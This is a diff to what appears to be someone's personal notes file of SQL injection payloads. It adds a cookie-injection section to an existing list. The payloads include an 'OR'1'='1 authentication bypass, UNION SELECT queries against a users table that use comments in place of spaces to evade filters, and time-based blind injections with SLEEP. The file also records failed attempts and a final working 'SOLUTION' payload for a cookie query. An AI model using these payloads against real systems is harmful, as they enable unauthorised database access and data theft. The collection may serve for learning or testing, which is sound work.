@@ -1,8 +1,4 @@
-/*************************\
-I figured I'd start documenting the various payloads I came up with to better document the development process and organise things a bit better
-/*************************\
-
-GET/POST
+ GET/POST
 'OR'1'='1
 '/**/UNION/**/SELECT*FROM/**/users/**/WHERE/**/id>'
 Use of functions in the query:
@@ -17,3 +13,22 @@ NO MULTI-STATEMENTS:
 INSERT INTO user_agents VALUES('mozilla') UNION SELECT SLEEP('5
 
 INSERT INTO user_agents VALUES('mozilla'); SELECT IF(2>1, SLEEP(2), 'no');--`');`
+
+
+
+
+
+COOKIE INJECTION:
+
+Failures: '/**/UNION/**/SELECT/**/SLEEP('5'),null; /*
+SELECT * FROM cookies WHERE id=''/**/UNION/**/SELECT/**/SLEEP('5'),null; /*' AND expiration > (SELECT UNIX_TIMESTAMP());
+'/**/UNION/**/SELECT/**/SLEEP('3'),null;/*
+'/**/UNION/**/SELECT/**/SLEEP('1'),null/**/FROM/**/users/**/WHERE/**/id>;--
+'/**/UNION/**/SELECT/**/SLEEP('5'),null; /*
+'/**/UNION/**/SELECT/**/SLEEP('5'),null; '';
+'/**/UNION/**/SELECT/**/SLEEP('3'),null;--'
+
+Syntactically correct but inapplicable:'/**/UNION/**/SELECT/**/SLEEP('3'),null;--
+
+SOLUTION: '/**/OR/**/(SELECT/**/SLEEP('2'))/**/OR/**/'
+(instead of trying to comment out the rest of the query, I decided to try and inject alongside it, as that seemed to be the path of least resistance.)
